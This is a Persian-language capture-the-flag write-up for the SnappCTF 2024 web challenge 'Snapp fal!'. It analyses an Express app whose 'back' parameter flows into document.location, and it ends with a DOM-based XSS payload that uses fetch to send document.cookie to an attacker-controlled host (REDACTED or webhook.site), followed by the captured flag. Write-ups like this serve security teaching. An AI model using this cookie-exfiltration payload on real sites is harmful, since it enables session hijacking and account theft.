---
tags:
  - SnappCTF
  - SnappCTF-2024
  - XSS
  - DOM-Based XSS
  - Web
---


<h1 dir="ltr">Snapp fal!</h1>

<figure markdown="span">

![snappfal.png](./snappfal.png)

</figure>

همینطور که میبینین این یه چالش XSS هستش که باید سعی کنیم کوکی های ادمین رو بخونیم و برای خودمون بفرستیم

بعد از باز کردن آدرس وبسایت ما با این صفحه روبرو میشیم

<figure markdown="span">

![snappfal1.png](./snappfal1.png)

</figure>

اگه روی دکمه *نشون بده* کلیک کنین وارد یه صفحه میشین که آدرسش به این صورت هستش:

‍‍```https://snappfal.spchallenge.ir/fal?back=/&fal=some-random-text-here```

که توی اون صفحه بهتون متن فال رو نشون میده که (همون چیزی هستش که توی پارامتر fal قرار داره) و بعد از چند ثانیه به آدرسی که توی پارامتر back قرار داره ریدایرکت میشیم


برای این سوال به ما سورس چالش رو دادن که میتونین اون رو دانلود کنین و اگه به فایل src.js  دقت کنیم که چطوری فال هارو برای ما نشون میده و چطوری مارو ریدایرکت میکنه

```js
#!/usr/bin/env node
const express = require('express')
const fs = require('fs')

const app = express()
const indexPage = fs.readFileSync('./pages/index.html').toString()
const falPage = fs.readFileSync('./pages/fal.html').toString()
const randomFals = [
	'%D8%AC%D9%84%D8%B3%D9%87%20%D8%A8%D8%B9%D8%AF%DB%8C%20%DA%A9%D9%84%D8%A7%D8%B3%D8%AA%20%DA%A9%D9%86%D8%B3%D9%84%20%D9%85%DB%8C%D8%B4%D9%87',
	'%D9%81%D8%B1%D8%AF%D8%A7%20%D8%AA%D9%88%20%DB%8C%DA%A9%20%D8%AA%D8%B1%D8%A7%D9%81%DB%8C%DA%A9%20%D8%B3%D9%86%DA%AF%DB%8C%D9%86%20%DA%AF%DB%8C%D8%B1%20%D9%85%DB%8C%DA%A9%D9%86%DB%8C',
	'%D8%AD%D9%82%D9%88%D9%82%D8%AA%20%D8%B3%D8%A7%D9%84%20%D8%AF%DB%8C%DA%AF%D9%87%20%D8%B3%D9%87%20%D8%A8%D8%B1%D8%A7%D8%A8%D8%B1%20%D9%85%DB%8C%D8%B4%D9%87'
]

app.get('/',(req,res)=>{
	res.send(indexPage)
})

app.get('/random-fal',(req,res)=>{
	res.redirect('/fal?back=/&fal='+randomFals[Math.floor(Math.random()*randomFals.length)],)
})

app.get('/fal',(req,res)=>{
	let to = (req.query.back ?? '/').toString()
	let fal = (req.query.fal || '').toString()

	to = to.replaceAll('"','\\x22').replaceAll('<','\\x3c')
	fal = fal.replaceAll('"','&quot;').replaceAll('<','&lt;')

	res.send(fs.readFileSync('./pages/fal.html').toString().replace('$fal$',fal).replace('$URL$',to))
})

app.listen(8000, () => {
	console.log('Server listening on port 3000')
})
```

توی مسیر <span dir="ltr">**/random-fal**</span> یک فال رندوم از آرایه randomFals میگیره و به مسیر <span dir="ltr">**/fal**</span> ریدایرکت میشیم

و توی مسیر <span dir="ltr">**/fal**</span> یه *back*, *fal* داریم که *back* آدرسی هستش که به اون ریدایرکت میشیم و fal هم متنی هستش که تو صفحه بهمون نشون میده ولی اگه دقت کنین مقدار fal escape میشه و نمیتونیم برای اون xss بزنیم

خب بیاین یه نگاهی به سورس صفحه ای بندازیم که توش فال ها به ما نشون داده میشه:

```sh
$  curl https://snappfal.spchallenge.ir/fal?back=ADDR_GOES_HERE&fal=FAL_GOES_HERE 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snapp fal!</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400&display=swap" rel="stylesheet">
<style>
    body {
        background-color: white;
    }

    .cont {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh; 
    }

    .card {
        background-color: #f7f6f2;
        padding: 60px 40px;
        border-radius: 10px;
        text-align: center;
    }

    button:hover {
        background-color: #40a38b;
    }

    span {
        color: #81766d;
        font-family: 'vazirmatn', sans-serif; 
        font-size: 32px;
        font-weight: bold;
        display: block;
    }
</style>
</head>
<body>
    <div class="cont">
        <div class="card">
            <span></span>
        </div>
    </div>
    <script>
        setTimeout(_=>{
            document.location = "ADDR_GOES_HERE"  
        },2000)
    </script>
</body>
</html>
```

خب مثله اینکه ادرسی که ما بهش میدیم میره مستقیم میشینه توی document.location ، پس اگه از javascript scheme استفاده کنیم میتونیم XSS بگیریم

ضمن اینکه توضیحات چالش هم به ما یه جورایی هینت داده و این [آدرس](https://portswigger.net/web-security/cross-site-scripting/dom-based) رو بهمون داده تا یه نگاهی بهش بندازیم

```
/fal?javascript:fetch(`https://REDACTED?flag${document.cookie}`)
```

به جای REDACTED آدرسی سرور خودتون رو بزارین تا فلگ براتون ارسال بشه یا اینکه از webhook.site استفاده کنین

حالا کافیه که آدرس رو بدیم به ادرس بات که برامون فلگ رو بفرسته xd

```
final addr: https://snappfal.spchallenge.ir/fal?back=javascript:fetch(`https://REDACTED?flag${document.cookie}`)
```

??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`SNAPP{89d36f80b85bde916fbdeb8592c1b368}`</div>


!!! نویسنده
    [amir303](https://x.com/amir3O3)

